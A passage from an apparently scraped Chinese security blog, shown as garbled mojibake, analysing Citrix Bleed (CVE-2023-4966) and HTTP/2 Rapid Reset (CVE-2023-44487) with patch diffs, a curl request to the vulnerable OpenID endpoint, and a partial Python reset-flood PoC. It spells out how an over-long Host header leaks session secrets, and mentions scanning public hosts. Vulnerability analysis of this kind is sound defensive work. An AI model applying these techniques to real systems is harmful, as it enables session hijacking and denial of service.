192.168.52.105\n13.1-49.15 192.168.52.95\næŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• åˆæ­¥åˆ†æ æ ¹æ®\rå®˜æ–¹é€šå‘Šå¯çŸ¥ä¸¤ä¸ªæ¼æ´éƒ½æ˜¯å¯¹å†…å­˜çš„æ“ä½œä¸å½“é€ æˆçš„ã€‚å¯¹åº”çš„CVSS3åˆ†åˆ«å¦‚ä¸‹\nCVE-2023-4966 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L CVE-2023-4967 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H ç»¼åˆå¯ä»¥çŸ¥é“å¦‚ä¸‹ä¿¡æ¯ï¼š åˆ©ç”¨æ¼æ´æ— éœ€æƒé™ã€ä½¿ç”¨ç½‘ç»œè¯·æ±‚å³å¯åˆ©ç”¨ã€å‡ä¸ºå†…å­˜å‹æ¼æ´ï¼Œåº”è¯¥è·Ÿ[[CVE-2023-3519 Citrix Gateway RCE|CVE-2023-3519)ç±»ä¼¼ï¼Œå¯¹ç”¨æˆ·è¾“å…¥æ²¡åšæ ¡éªŒï¼Œå…¶ä¸­CVE-2023-4966 åº”è¯¥æ˜¯å®ç°äº†è¶Šç•Œè¯»å–å†…å­˜ã€‚ å‡½æ•°diff diff nsppeæ–‡ä»¶ï¼Œåˆ†æå„ä¸ªå‡½æ•°ä¿®æ”¹çš„åœ°æ–¹ã€‚\nåœ¨é€ä¸ªåˆ†æå„ä¸ªå‡½æ•°ä¹‹åï¼Œç›®å…‰è½¬åˆ°ns_aaa_oauth_send_openid_configå‡½æ•°ã€‚\nåœ¨è¡¥ä¸ä¸­ ns_aaa_oauth_send_openid_configä¸­å¯¹snprintfçš„è¿”å›å€¼åšäº†åˆ¤æ–­ï¼Œåœ¨ä¿®å¤ä¹‹å‰ç›´æ¥å°†snpritfçš„è¿”å›å€¼æ”¾åˆ°äº†ns_vpn_send_responseä¸­ï¼Œä¿®å¤ä¹‹åå…ˆåˆ¤æ–­è¿”å›å€¼æ˜¯å¦å¤§äº1FFFFã€‚\nsnprintfå°†æ ¼å¼åŒ–çš„æ•°æ®ï¼Œå†™å…¥å†…å­˜ä¸­ï¼ŒåŸå‹ä¸ºint snprintf(char *str, int n, char * format [, argument, ...]);ï¼Œå…¶ä¸­nä¸ºè¦å†™å…¥çš„å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ï¼Œsnprintfæœ€å¤šä¼šç»™å†…å­˜å†™å…¥n-1ä¸ªå­—ç¬¦ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ä½¿ç”¨'\\0'ï¼Œå½“è¦æ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²å¤§äºnæ—¶ï¼Œä¼šåœ¨n-1å¤„æˆªæ–­ã€‚ä½†æ­¤æ—¶ï¼Œsnprintfä¼šè¿”å›æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè€Œä¸æ˜¯å†™å…¥å†…å­˜çš„é•¿åº¦ã€‚\nå‘ä¸Šè¿½æº¯è°ƒç”¨æ ˆï¼Œns_aaa_oauth_send_openid_configè¢« ns_vpn_process_unauthenticated_requestè°ƒç”¨ï¼Œå°† ns_vpn_process_unauthenticated_request ä»£ç ç»™AIåˆ†æè°ƒç”¨åˆ°è¯¥å‡½æ•°çš„è·¯å¾„ï¼Œå¯çŸ¥è°ƒç”¨è·¯å¾„ä¸º /oauth/idp/.well-known/openid-configuration æ­¤å¤„çŒœæµ‹æœªä¿®å¤ç‰ˆæœ¬ä¸­ä¼šä½¿ç”¨snprintfçš„è¿”å›å€¼ä½œä¸ºé•¿åº¦å‚æ•°è¿›è¡Œè¯»å–ã€‚ curlè¯·æ±‚è¯¥æ¥å£ï¼Œå¯ä»¥çœ‹åˆ°å“åº”ä¸­ä¸­ä¼šæŠŠæˆ‘ä»¬è¯·æ±‚çš„hostæ”¾è¿›å»\n$ curl -i -s -k -X $\u0026#39;GET\u0026#39; -H $\u0026#39;Host: curl.test.site\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0\u0026#39; -H $\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\u0026#39; -H $\u0026#39;Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate\u0026#39; -H $\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H $\u0026#39;Sec-Fetch-Dest: document\u0026#39; -H $\u0026#39;Sec-Fetch-Mode: navigate\u0026#39; -H $\u0026#39;Sec-Fetch-Site: none\u0026#39; -H $\u0026#39;Sec-Fetch-User: ?1\u0026#39; -H $\u0026#39;Te: trailers\u0026#39; -H $\u0026#39;Connection: close\u0026#39; -b $\u0026#39;NSC_TASS=/menu/neo\u0026#39; $\u0026#39;https://192.168.52.234/oauth/idp/.well-known/openid-configuration\u0026#39; HTTP/1.1 200 OK X-Content-Type-Options: nosniff X-XSS-Protection: 1; mode=block Content-Length: 717 Cache-control: no-cache, no-store, must-revalidate Pragma: no-cache Content-Type: application/json; charset=utf-8 X-Citrix-Application: Receiver for Web {\u0026#34;issuer\u0026#34;: \u0026#34;https://curl.test.site\u0026#34;, \u0026#34;authorization_endpoint\u0026#34;: \u0026#34;https://curl.test.site/oauth/idp/login\u0026#34;, \u0026#34;token_endpoint\u0026#34;: \u0026#34;https://curl.test.site/oaut h/idp/token\u0026#34;, \u0026#34;jwks_uri\u0026#34;: \u0026#34;https://curl.test.site/oauth/idp/certs\u0026#34;, \u0026#34;response_types_supported\u0026#34;: [\u0026#34;code\u0026#34;, \u0026#34;token\u0026#34;, \u0026#34;id_token\u0026#34;], \u0026#34;id_token_signing_alg_va lues_supported\u0026#34;: [\u0026#34;RS256\u0026#34;], \u0026#34;end_session_endpoint\u0026#34;: \u0026#34;https://curl.test.site/oauth/idp/logout\u0026#34;, \u0026#34;frontchannel_logout_supported\u0026#34;: true, \u0026#34;scopes_supported \u0026#34;: [\u0026#34;openid\u0026#34;, \u0026#34;ctxs_cc\u0026#34;], \u0026#34;claims_supported\u0026#34;: [\u0026#34;sub\u0026#34;, \u0026#34;iss\u0026#34;, \u0026#34;aud\u0026#34;, \u0026#34;exp\u0026#34;, \u0026#34;iat\u0026#34;, \u0026#34;auth_time\u0026#34;, \u0026#34;acr\u0026#34;, \u0026#34;amr\u0026#34;, \u0026#34;email\u0026#34;, \u0026#34;given_name\u0026#34;, \u0026#34;family_name\u0026#34;, \u0026#34;nic kname\u0026#34;], \u0026#34;userinfo_endpoint\u0026#34;: \u0026#34;https://curl.test.site/oauth/idp/userinfo\u0026#34;, \u0026#34;subject_types_supported\u0026#34;: [\u0026#34;public\u0026#34;]} å‰é¢çŸ¥é“print_temp_ruleå¤§å°ä¸º0x20000ï¼Œè¿”å›å€¼ä¸­å…±æœ‰6å¤„é‡å¤äº†hostï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å…¥çš„hosté•¿åº¦\u0026gt;21845(ç²—ç•¥ä¼°è®¡)å°±å¯ä»¥è§¦å‘æº¢å‡ºã€‚å†æ¬¡è¯·æ±‚ï¼Œå‘ç°å¯ä»¥åˆ©ç”¨è¶…é•¿hostè¯»å–åˆ°Citrixå†…å­˜ï¼Œå®é™…æµ‹è¯•å‘ç°hosté•¿åº¦æœ€å¤šåˆ°24100å·¦å³ã€‚\nå€ŸåŠ©è¿™ä¸ªæ¼æ´ï¼Œå†™äº†ä¸€ä¸ªnucleiæ¨¡æ¿å¯¹å…¬ç½‘æ‰«æï¼Œå¯¹å…«ç™¾ä¸ªç‹¬ç«‹IPæ‰«æï¼Œæˆªæ­¢è‡³10.20ï¼Œä»ç„¶æœ‰å¤§çº¦15%æœªä¿®å¤ï¼Œä¸”é€šè¿‡è¿™ä¸ªæ¼æ´å¯ä»¥è¯»å–åˆ°å†…å­˜ä¸­çš„secretï¼Œåç»­å¯ä»¥å€ŸåŠ©è¿™ä¸ªsecretç»•è¿‡èº«ä»½éªŒè¯ï¼Œè¯·æ±‚åç«¯æ¥å£ã€‚\nè¿™ä¸ªæ¥å£ä¹Ÿåœ¨oauthçš„é…ç½®ä¸­æœ‰æåˆ°\rhttps://support.citrix.com/article/CTX234873/how-to-deploy-netscaler-as-both-oauth-sp-and-idp\nns_aaa_oauthrp_send_openid_configå‡½æ•°ç±»ä¼¼ï¼Œä¹Ÿsnprintfçš„è¿”å›å€¼åšäº†åˆ¤æ–­ã€‚ è°ƒè¯•\nå…³é—­çœ‹é—¨ç‹—å¯¹nsppeè¿›ç¨‹å‘é€çš„ä¿¡å·ï¼Œè€Œåç›´æ¥åœ¨å¯¹åº”ä½ç½®å¤„ä¸‹æ–­ç‚¹å³å¯ã€‚\nroot@citrix3# nspf help Usage: \u0026#39;/netscaler/nspf ((\u0026lt;process_name\u0026gt; | \u0026lt;pid\u0026gt;) \u0026lt;action\u0026gt; | query)\u0026#39; where \u0026lt;process_name\u0026gt; is one of: NSPPE-00 aslearn awsconfig bgpd de imi isisd metricscollectomonuploadd nsaaad nsaggregatord nscfsyncd nsclfsyncd nsclusterd nsconfigd nscopo nsfsyncd nsgslbautosyncnslcd nslped nsm nsnetsvc nsrised nstraceaggregatnsumond ospf6d ospfd ptpd ripd ripngd snmpd syshealthd root@citrix3# /netscaler/nspf nsppe-00 pbmonitor 0 nspf NSPPE-00 pbmonitor 0 Removing pitboss monitor on process NSPPE-00 pid 37387 PoC\nhttps://github.com/Chestnuts4/POC/blob/master/nuclei_poc/CVE-2023-4966_citrix_info_disclose.yaml å®é™…åˆ©ç”¨\né€šè¿‡æ¼æ´å¯ä»¥è¯»å–åˆ°å†…å­˜ä¸­çš„å·²ç™»å½•ä¼šè¯çš„secretã€‚\nå°ç»“ è¯¥æ¼æ´æ•´ä½“åˆ†æã€åˆ©ç”¨è¾ƒä¸ºç®€å•ï¼Œ é€šè¿‡æœ´å®æ— åçš„è¶Šç•Œè¯»å–å³å¯é€ æˆä¿¡æ¯æ³„éœ²ï¼Œä¹Ÿæ— éœ€è¿›è¡Œå†…å­˜å¸ƒå±€ã€‚å…¶å®æ•´ä½“çœ‹nsppeï¼Œå¾ˆå¤šä½¿ç”¨äº†snprintfçš„åœ°æ–¹éƒ½å¯¹å…¶è¿”å›å€¼è¿›è¡Œäº†åˆ¤æ–­ï¼Œæœ¬æ¬¡æ¼æ´ç‚¹æ²¡æœ‰å¯¹è¿”å›å€¼åšåˆ¤æ–­å¯èƒ½æ˜¯å› ä¸ºå¼€å‘æ—¶é—æ¼äº†ã€‚\nå¦å¤–å³ä½¿ä¿®å¤è¯¥æ¼æ´ä¹‹åï¼Œå·²è¢«åŠ«æŒçš„ä¼šè¯ä»ç„¶æœ‰æ•ˆï¼Œéœ€è¦ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¸…é™¤å·²ç™»å½•çš„ä¼šè¯\nclar lb persistentSessions \u0026lt;vServer\u0026gt; å‚è€ƒé“¾æ¥\nhttps://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967\nhttps://support.citrix.com/article/CTX234873/how-to-deploy-netscaler-as-both-oauth-sp-and-idp\nhttps://www.citrix.com/downloads/citrix-adc/\nCreated at 2023-10-26T10:18:12+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/","title":"CVE-2023-44487 Http2 Rapid Reset DDOS Attack åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ åˆ©ç”¨ HTTP/2 çš„å¤šè·¯å¤ç”¨æµåŠŸèƒ½ï¼Œæ¶æ„æ”»å‡»è€…å¯é€šè¿‡å¿«é€Ÿåˆ›å»ºè¯·æ±‚å¹¶ç«‹å³é‡ç½®è¯·æ±‚ï¼Œç»•è¿‡æœ€å¤§å¹¶å‘æµé™åˆ¶ï¼Œå¯¼è‡´æœåŠ¡å™¨èµ„æºçš„è¿‡åº¦æ¶ˆè€—ã€‚\nå½±å“èŒƒå›´ Go \u0026lt; 1.21.3 Go \u0026lt; 1.20.10\n11.0.0-M1 \u0026lt;= Apache Tomcat \u0026lt;= 11.0.0-M11 10.1.0-M1 \u0026lt;= Apache Tomcat \u0026lt;= 10.1.13 9.0.0-M1 \u0026lt;= Apache Tomcat \u0026lt;= 9.0.80 8.5.0 \u0026lt;= Apache Tomcat \u0026lt;= 8.5.9\ngrpc-go \u0026lt; 1.58.3 grpc-go \u0026lt; 1.57.1 grpc-go \u0026lt; 1.56.3\nç¯å¢ƒæ­å»º ä½¿ç”¨goèµ·ä¸€ä¸ªhttp2 serverã€‚\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; ) func main() { http.HandleFunc(\u0026#34;/\u0026#34;, func(w http.ResponseWriter, r *http.Request) { fmt.Println(r.Proto, r.URL) fmt.Fprint(w, \u0026#34;Hello World!\u0026#34;) }) http.ListenAndServeTLS(\u0026#34;:443\u0026#34;, \u0026#34;certs/cert.pem\u0026#34;, \u0026#34;certs/key.pem\u0026#34;, nil) } ä½¿ç”¨curlæµ‹è¯•æ˜¯å¦æˆåŠŸ curl https://localhost -i -k --http2 -vvvã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨nginxæ­å»ºä¸€ä¸ªhttp2æœåŠ¡å™¨ï¼Œé…ç½®å¾ˆå¤šåšå®¢éƒ½æœ‰å°±ä¸å†™äº†ã€‚\nâœ http curl https://localhost -i -k --http2 -vvv * Trying 127.0.0.1:443... * Connected to localhost (127.0.0.1) port 443 (#0) * ALPN: offers h2,http/1.1 * TLSv1.3 (OUT), TLS handshake, Client hello (1): * TLSv1.3 (IN), TLS handshake, Server hello (2): * TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8): * TLSv1.3 (IN), TLS handshake, Certificate (11): * TLSv1.3 (IN), TLS handshake, CERT verify (15): * TLSv1.3 (IN), TLS handshake, Finished (20): * TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1): * TLSv1.3 (OUT), TLS handshake, Finished (20): * SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 * ALPN: server accepted h2 * Server certificate: * subject: C=XX; ST=StateName; L=CityName; O=CompanyName; OU=CompanySectionName; CN=CommonNameOrHostname * start date: Oct 12 08:46:51 2023 GMT * expire date: Oct 9 08:46:51 2033 GMT * issuer: C=XX; ST=StateName; L=CityName; O=CompanyName; OU=CompanySectionName; CN=CommonNameOrHostname * SSL certificate verify result: self-signed certificate (18), continuing anyway. * using HTTP/2 * h2h3 [:method: GET] * h2h3 [:path: /] * h2h3 [:scheme: https] * h2h3 [:authority: localhost] * h2h3 [user-agent: curl/7.88.1] * h2h3 [accept: */*] * Using Stream ID: 1 (easy handle 0x55566530a9e0) \u0026gt; GET / HTTP/2 \u0026gt; Host: localhost \u0026gt; user-agent: curl/7.88.1 \u0026gt; accept: */* \u0026gt; * TLSv1.3 (IN), TLS handshake, Newsession Ticket (4): \u0026lt; HTTP/2 200 HTTP/2 200 \u0026lt; content-type: text/plain; charset=utf-8 content-type: text/plain; charset=utf-8 \u0026lt; content-length: 12 content-length: 12 \u0026lt; date: Fri, 13 Oct 2023 06:52:06 GMT date: Fri, 13 Oct 2023 06:52:06 GMT \u0026lt; * Connection #0 to host localhost left intact Hello World!# æŠ€æœ¯åˆ†æ å…¶å®è¿™ä¸ªåœ¨æˆ‘çœ‹æ¥æŸäº›æ–¹é¢çœ‹ä¹Ÿä¸ç®—æ¼æ´ï¼Œæ ¹æ®\rRFC9113è§„å®šï¼Œåœ¨HTTP2 settingé˜¶æ®µæœåŠ¡å™¨å¯ä»¥å£°æ˜æ”¯æŒçš„æœ€å¤§å¹¶å‘æµï¼ŒåŒæ—¶è§„å®šäº†å®¢æˆ·ç«¯æˆ–æœåŠ¡ç«¯å¯ä»¥éšæ—¶å‘é€RST_STREAMä»¥å–æ¶ˆæµï¼Œåœ¨æ”¶åˆ°RST_STREAMæ¥æ”¶æ–¹ä¸èƒ½åœ¨å‘é€å…¶ä»–æ•°æ®ï¼Œé™¤äº†ä¼˜å…ˆçº§ï¼Œåè®®å¹¶æœªè§„å®šå®¢æˆ·ç«¯å‘é€RST_STREAMçš„é˜ˆå€¼ï¼Œé‚£ä¹ˆå„å¤§è¯­è¨€å’Œè½¯ä»¶å®ç°çš„æ—¶å€™å¯èƒ½é™åˆ¶ä¹Ÿæœ‰å¯èƒ½ä¸é™åˆ¶RST_STREAMçš„é˜ˆå€¼ã€‚è¿™å±äºæ˜¯å„è‡ªå®ç°æ–¹å¼çš„é—®é¢˜ã€‚ ä»åè®®å±‚é¢è®²ï¼Œå®¢æˆ·ç«¯ç›´æ¥RST_STREAMæ²¡æœ‰é—®é¢˜ï¼Œå…¸å‹çš„åœºæ™¯æ˜¯ç”¨æˆ·åœ¨æµè§ˆå™¨è®¿é—®ç½‘ç«™æœŸé—´å› ä¸ºæŸäº›åŸå› ç›´æ¥å…³é—­äº†é¡µé¢ï¼Œæ­¤æ—¶æµè§ˆå™¨éœ€è¦å‘æœåŠ¡ç«¯å‘é€RST_STREAMå¸§æ¥å–æ¶ˆæµï¼Œå¯ä»¥å¸®åŠ©æœåŠ¡å™¨èŠ‚çœèµ„æºã€‚\nHTTPçš„å‡ ç§DDOS HTTP 1.1 åœ¨HTTP 1.1ä¸­ä½¿ç”¨å•ä¸ªTCPè¿æ¥é¡ºåºå‘é€è¯·æ±‚å’Œå“åº”ï¼Œåœ¨å‰é¢çš„è¯·æ±‚è¢«å“åº”ä¹‹åæ‰å¯ä»¥å‘é€åç»­çš„è¯·æ±‚ï¼Œä¸èƒ½è¢«å¤šè·¯å¤ç”¨ï¼Œæ­¤æ—¶å¦‚æœè¦å¯¹å…¶è¿›è¡ŒDOSçš„è¯éœ€è¦å¤§é‡æœºå™¨æ‰“å¼€TCPè¿æ¥é¡ºåºå‘é€è¯·æ±‚ï¼Œæ¶ˆè€—èµ„æºã€‚ HTTP 2 HTTP2ä¸­å®ç°äº†å¤šè·¯å¤ç”¨å’Œå¹¶å‘ï¼Œå¯ä»¥å¼‚æ­¥è¯·æ±‚ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯é€šè¿‡æµIDæ¥è¯†åˆ«æ•°æ®å±äºå“ªä¸€ä¸ªè¯·æ±‚ï¼Œè¿™å’ŒHTTP1.1 ç›¸æ¯”ï¼Œå®¢æˆ·ç«¯å¯ä»¥å¯ç”¨å¤§é‡å¹¶è¡Œè¯·æ±‚ï¼Œé€ æˆæœåŠ¡å™¨è´Ÿè½½ä¸Šå‡ï¼Œæ‰€ä»¥ä¸ºäº†é˜²æŠ¤è¿™ç§æƒ…å†µï¼Œåœ¨HTTP2åˆå§‹åŒ–çš„æ—¶å€™ï¼ŒSETTINGS_MAX_CONCURRENT_STREAMSå…è®¸æœåŠ¡å™¨å‘å®¢æˆ·ç«¯é€šå‘Šæœ€å¤§å…è®¸çš„å¹¶å‘æµï¼Œè¶…è¿‡è¿™ä¸ªé™åˆ¶çš„æµï¼ŒæœåŠ¡å™¨ä¼šè¿”å›RST_STREAMæ¥æ‹’ç»è¿™ä¸ªæµã€‚HTTP2å„ä¸ªçŠ¶æ€å¯ä»¥ä½¿ç”¨çŠ¶æ€æœºè¡¨ç¤ºï¼Œå½“æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯å‘é€çš„HEADERSå¸§æ—¶ï¼Œä¼šå°†æµçŠ¶æ€ä»ç©ºé—²è½¬æ¢ä¸ºæ‰“å¼€ï¼Œè€Œåè½¬ä¸ºåŠå…³é—­çŠ¶æ€ï¼Œåªæœ‰æµå¤„äºæ‰“å¼€çŠ¶æ€æˆ–åŠå…³é—­çŠ¶æ€æ‰ä¼šè¢«è®¡å…¥æ‰“å¼€çš„æµæ•°é‡ã€‚ æ¥æº:\rhttps://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/\nä¸Šé¢æåˆ°ï¼Œåªæœ‰æ‰“å¼€å’ŒåŠå…³é—­çš„æµæ‰ä¼šè®¡å…¥æµæ•°é‡ï¼Œå½±å“å¹¶å‘é™åˆ¶ï¼Œå½“å®¢æˆ·ç«¯å‘é€RST_STREAMæ—¶ï¼ŒæµçŠ¶æ€ä¼šä»åŠå…³é—­çŠ¶æ€è½¬å…¥å…³é—­çŠ¶æ€ï¼Œå³é‡Šæ”¾äº†ä¸€ä¸ªæµï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å¯ä»¥ç«‹å³å‘èµ·ä¸€ä¸ªæ–°è¯·æ±‚å ç”¨é‡Šæ”¾çš„æµï¼Œè¿™å°±æ˜¯CVE-2023-44487çš„å…³é”®ã€‚æ¶æ„å®¢æˆ·ç«¯å¯ä»¥åœ¨æ‰“å¼€å¤§é‡æµä¹‹åç«‹å³å‘é€RST_STREAMå¸§ï¼Œè¿™æ ·åœ¨è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨ï¼Œè€ŒæœåŠ¡å™¨æš‚æœªå‡†å¤‡å¥½å“åº”æ—¶ï¼Œè¿™ä¸ªè¯·æ±‚çš„RST_STREAMå¸§éšæœºåˆ°è¾¾æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å–æ¶ˆè¿™ä¸ªæµå¹¶é‡Šæ”¾ä¸€ä¸ªå¹¶å‘æµã€‚\nå›¾ç‰‡æ¥æºï¼š\rhttps://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack\nåœ¨æ ‡å‡†HTTP2 DDOSçš„æ—¶å€™ï¼Œæ¶æ„å®¢æˆ·ç«¯å¯ä»¥æ‰“å¼€æœåŠ¡å™¨å…è®¸çš„æœ€å¤§é™åˆ¶çš„æµæ•°é‡è€Œåå‘é€è¯·æ±‚ï¼ŒæœåŠ¡å™¨ä¾æ¬¡å“åº”ï¼Œå¾ªç¯è¿™ä¸ªè¿‡ç¨‹ï¼Œæ¶ˆè€—æœåŠ¡å™¨èµ„æºã€‚ è€Œå˜ç§HTTP2 DDOSä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨CVE-2023-44487 ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œæ»¥ç”¨HTTP 2çš„å–æ¶ˆè¯·æ±‚ï¼Œå¿«é€Ÿé‡ç½®æ— é™æ•°é‡çš„æµï¼Œæ ¹æ®RFC æœåŠ¡å™¨æ”¶åˆ°RST_STREAMå¸§ä¹‹åä¸éœ€è¦è¿”å›æ•°æ®ï¼Œåœ¨ç°å®å®ç°æ—¶ï¼ŒæœåŠ¡å™¨æ”¶åˆ°äº†å®¢æˆ·ç«¯çš„HRADERSè¯·æ±‚ï¼Œåœ¨æ”¶åˆ°RST_STREAMä¹‹å‰ï¼Œéœ€è¦è§£æå®¢æˆ·ç«¯è¯·æ±‚çš„èµ„æºï¼Œåœ¨æ”¶åˆ°RST_STREAMä¹‹åéœ€è¦é‡Šæ”¾èµ„æºï¼Œæ‰€ä»¥åœ¨å®¢æˆ·ç«¯åªéœ€è¦ä»˜å‡ºå¸¦å®½çš„ä»£ä»·ä¸‹ï¼ŒæœåŠ¡å™¨ä¼šä»˜å‡ºæ¯”è¿™ä¸ªé«˜å¾—å¤šçš„ä»£ä»·ï¼Œå¯¼è‡´é«˜æ•ˆç‡çš„DDOSã€‚\nè¡¥ä¸åˆ†æ\nåœ¨goä¸­æ”¯æŒHTTP2åè®®çš„è§£æï¼Œæ‰€ä»¥goä¹Ÿå—è¿™ä¸ªæ¼æ´å½±å“ï¼Œä¸‹é¢æ˜¯goä¿®å¤æ¼æ´çš„è¡¥ä¸diff å¯¹æ¯”goä¿®å¤è¿™ä¸ªæ¼æ´çš„è¡¥ä¸ï¼Œä¸»è¦ä¿®å¤é€»è¾‘åœ¨http2#scheduleHandlerï¼Œå…¶ä¸­advMaxStreamsé»˜è®¤ä¸º250ï¼Œå½“åœ¨å¤„ç†çš„æµè¶…è¿‡äº†250ï¼Œåˆ™æ¯”è¾ƒæœªå¼€å§‹å¤„ç†çš„æµæ•°é‡æ˜¯å¦å¤§äº1000ï¼Œå¤§äºåˆ™æŠ¥é”™ã€‚ å¯ä»¥çœ‹å‡ºæ¥è¡¥ä¸ä¸»è¦æ˜¯é™åˆ¶äº†åŒæ—¶å¹¶å‘æµçš„æ•°é‡ã€‚è¯¥æ–¹æ³•åœ¨processHeadersä¸­è°ƒç”¨ï¼Œå¯ä»¥çœ‹å‡ºæ¥ï¼Œåœ¨åŸå…ˆé€»è¾‘ä¸­ï¼Œä¼šç›´æ¥å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼Œè€Œåœ¨è¡¥ä¸ä¸­ä¼šåˆ¤æ–­å½“å‰æµçš„æ•°é‡ï¼Œåœ¨èŒƒå›´å†…æ‰ä¼šè°ƒç”¨ go sc.runHandler(rw, req, handler)å¤„ç†è¯·æ±‚\ntype unstartedHandler struct { streamID uint32 rw *responseWriter req *http.Request handler func(http.ResponseWriter, *http.Request) } // scheduleHandler starts a handler goroutine, // or schedules one to start as soon as an existing handler finishes. func (sc *serverConn) scheduleHandler(streamID uint32, rw *responseWriter, req *http.Request, handler func(http.ResponseWriter, *http.Request)) error { sc.serveG.check() maxHandlers := sc.advMaxStreams if sc.curHandlers \u0026lt; maxHandlers { sc.curHandlers++ go sc.runHandler(rw, req, handler) return nil } if len(sc.unstartedHandlers) \u0026gt; int(4*sc.advMaxStreams) { return sc.countError(\u0026#34;too_many_early_resets\u0026#34;, ConnectionError(ErrCodeEnhanceYourCalm)) } sc.unstartedHandlers = append(sc.unstartedHandlers, unstartedHandler{ streamID: streamID, rw: rw, req: req, handler: handler, }) return nil } func (sc *serverConn) handlerDone() { sc.serveG.check() sc.curHandlers-- i := 0 maxHandlers := sc.advMaxStreams for ; i \u0026lt; len(sc.unstartedHandlers); i++ { u := sc.unstartedHandlers[i] if sc.streams[u.streamID] == nil { // This stream was reset before its goroutine had a chance to start. continue } if sc.curHandlers \u0026gt;= maxHandlers { break } sc.curHandlers++ go sc.runHandler(u.rw, u.req, u.handler) sc.unstartedHandlers[i] = unstartedHandler{} // don\u0026#39;t retain references } sc.unstartedHandlers = sc.unstartedHandlers[i:] if len(sc.unstartedHandlers) == 0 { sc.unstartedHandlers = nil } } nginxé’ˆå¯¹è¿™ä¸ªæ¼æ´ä¹Ÿå‡ºäº†ä¸€ä»½\rå®˜æ–¹é€šå‘ŠæŒ‡å‡ºé»˜è®¤é…ç½®ä¸å—æ­¤æ¼æ´å½±å“ï¼Œå³ keepalive_requests 1000;http2_max_concurrent_streams 128;è¿™ä¸ªé…ç½®ä¹Ÿå¯ä»¥å¯¹åº”ä¸Šgoè¡¥ä¸ä¸­çš„250æœ€å¤§streamå’Œ1000ä¸ªé˜Ÿåˆ—ã€‚\nè™½ç„¶é»˜è®¤é…ç½®ä¸å—è¯¥æ¼æ´å½±å“ï¼Œä½†nginxä¹Ÿé’ˆå¯¹è¿™ä¸ªæ¼æ´è¿›è¡Œäº†ä¿®å¤ï¼Œcommitä¸º\r6ceef192e7af1c507826ac38a2d43f08bf265fb9ï¼Œåœ¨è¯¥commitä¸­ä¹Ÿæ˜¯ç»Ÿè®¡å¹¶é™åˆ¶äº†å¹¶å‘æµæ•°é‡ï¼Œè¶…è¿‡æŸä¸ªé˜ˆå€¼åˆ™è¿”å›é”™è¯¯ã€‚\nå¼€å‘PoC\nåœ¨GitHubçš„\rPoCç»è¿‡å®é™…æµ‹è¯•ï¼Œæ²¡æœ‰è¾¾åˆ°è°·æ­Œå’ŒCFæ‰€è¯´çš„åœ¨å‘HTTP2è¯·æ±‚ä¹‹åç«‹é©¬é‡ç½®ï¼Œä¹Ÿå°±æ˜¯æ— æ•ˆPoCã€‚æ ¹æ®ä»£ç é€»è¾‘ï¼Œåœ¨å‘é€HTTP2 headerä¹‹åPoCæ¥ç€å°è¯•æ¥æ”¶æœåŠ¡å™¨è¿”å›çš„æ•°æ®ï¼Œå¦‚æœæœåŠ¡ç«¯è¿”å›äº†StreamResetåˆ™æ‰“å°å·²æˆåŠŸå–æ¶ˆï¼Œå¦‚æœæ˜¯RequestReceivedåˆ™è°ƒç”¨conn.reset_streamï¼Œä½†å®é™…åˆ©ç”¨åº”è¯¥æ˜¯å‘é€HTTP2 headerä¹‹åç«‹é©¬å‘é€RST_Streamï¼Œè€Œåæ‰“å¼€ä¸€ä¸ªæ–°æµé‡å¤å¦‚ä¸Šè¿‡ç¨‹ã€‚ å®é™…æµ‹è¯•å‘ç°ï¼Œconn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL)æ°¸è¿œä¸ä¼šè¢«è°ƒç”¨åˆ°ï¼Œä¹Ÿå°±æ˜¯è¯¥PoCä¼šæ‰§è¡Œå®Œæ•´çš„HTTP2è¯·æ±‚ï¼Œå®Œäº‹ä¹‹åæœåŠ¡ç«¯è¿”å›RST_STREAMï¼Œæ‰“å°å·²å–æ¶ˆï¼Œè¿™æ˜æ˜¾æ˜¯é”™è¯¯çš„ã€‚\nstream_id = conn.get_next_available_stream_id() conn.send_headers( stream_id, [(\u0026#39;:method\u0026#39;, \u0026#39;GET\u0026#39;), (\u0026#39;:authority\u0026#39;, url), (\u0026#39;:path\u0026#39;, \u0026#39;/\u0026#39;), (\u0026#39;:scheme\u0026#39;, \u0026#39;https\u0026#39;)], ) sock.sendall(conn.data_to_send()) # Read some data while True: data = sock.recv(65535) if not data: break events = conn.receive_data(data) for event in events: if 